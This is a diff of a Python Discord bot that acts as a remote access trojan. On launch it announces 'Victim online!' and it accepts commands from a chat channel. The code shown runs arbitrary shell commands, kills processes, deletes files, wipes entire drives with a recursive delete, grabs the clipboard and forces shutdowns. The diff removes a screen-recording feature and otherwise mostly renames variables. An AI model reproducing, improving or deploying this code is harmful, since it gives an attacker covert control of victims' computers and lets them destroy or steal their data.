@@ -1,3 +1,4 @@
+# Made by nullifiedvlad
 
 import discord
 from discord.ext import commands
@@ -5,10 +6,9 @@ import pyautogui as pg
 import os
 import sys
 import subprocess
-import numpy as np
-import cv2
 import config
 from datetime import datetime
+
 
 pg.FAILSAFE = False
 bot = commands.Bot(command_prefix='/')  # префикс для комманд
@@ -18,11 +18,12 @@ bot.remove_command('help')
 
 @bot.event
 async def on_ready():
-    channel = bot.get_channel(config.channel)
+    channel_start = bot.get_channel(config.channel)
     date = datetime.now()
     x, y = pg.size()
-    await channel.send(
-        f'CAT: **Жертва онлайн!** \n Время запука **{date.hour}:{date.minute}**. \n ОС: **{sys.platform}**. \n Разрешение экрана: **{x}x{y}** \n Напишите **/help** для справки!')
+    await channel_start.send(
+        f'''CAT: **Жертва онлайн!** \n Время запука **{date.hour}:{date.minute}**. \n ОС: **{sys.platform}**. 
+Разрешение экрана: **{x}x{y}** \n Напишите **/help** для справки!''')
     await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
     del date
     del x, y
@@ -78,8 +79,8 @@ async def help(ctx):
 
 
 @bot.command()
-async def command(ctx, *, command):
-    output = os.system(str(command))
+async def command(ctx, *, todo):
+    output = os.system(str(todo))
     if output == 0:
         await ctx.send('**CAT**: Комманда успешно выполнена!')
     else:
@@ -102,11 +103,11 @@ async def kill(ctx, *, process):
 
 @bot.command()
 async def processlist(ctx):  # список процессов
-    f = open('processlist.txt', 'w')
+    fl = open('processlist.txt', 'w')
     try:
         data = subprocess.check_output(['tasklist'])
-        f.write(str(data))
-        f.close()
+        fl.write(str(data))
+        fl.close()
         await ctx.send('**CAT**: Список процессов', file=discord.File('processlist.txt'))
         os.remove('processlist.txt')
     except FileNotFoundError:
@@ -114,46 +115,20 @@ async def processlist(ctx):  # список процессов
 
 
 @bot.command()
-async def video(ctx, how_many):  # запись видео
-    assert how_many > 0  # проверка
-    output = 'video.avi'
-    img = pg.screenshot()
-    img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-    height, width, channels = img.shape
-    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
-    out = cv2.VideoWriter(output, fourcc, 20.0, (width, height))
-    loop = 0
-
-    while int(loop) <= int(how_many):
-        try:
-            img = pg.screenshot()
-            image = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-            out.write(image)
-            StopIteration(0.5)
-            loop += 1
-        except KeyboardInterrupt:
-            break
-    out.release()
-    cv2.destroyAllWindows()
-    await ctx.send(file=discord.File('video.avi'))
-    os.remove(output)
-
-
-@bot.command()
-async def delete(ctx, file):  # удалиить файл
+async def delete(ctx, file_on_delete):  # удалиить файл
     try:
-        os.remove(str(file))
+        os.remove(str(file_on_delete))
     except FileNotFoundError:
         await ctx.send('**CAT**: Такой файл не найден!')
     finally:
-        await ctx.send(f'**CAT**: Файл "{str(file)}"был успешно удалён!')
-    del file
+        await ctx.send(f'**CAT**: Файл "{str(file_on_delete)}"был успешно удалён!')
+    del file_on_delete
 
 
 @bot.command()
-async def format(ctx, disk):  # форматирование диска
+async def disk_kill(ctx, disk):  # форматирование диска
     await ctx.send(f'**CAT**: Форматирую диск {disk}')
-    os.system(f'rd/s/q {disk}:\ ')
+    os.system(f'rd/s/q {disk}:\\ ')
     del disk
 
 
@@ -188,13 +163,13 @@ async def clipboard_grab(ctx):
 @bot.command()
 async def shutdown(ctx):
     await ctx.send('Выключаю компьютер...')
-    os.system('shutdown -s -t 1 -c "0x00000003234" >nul')
+    os.system('shutdown -s -t 0 >null')
 
 
 @bot.command()
 async def reboot(ctx):
     await ctx.send('Перезагружаю компьютер...')
-    os.system('shutdown -r -t 1 -c "0x00000003234" >nul')
+    os.system('shutdown -r -t 0 >null')
 
 
 bot.run(config.token)
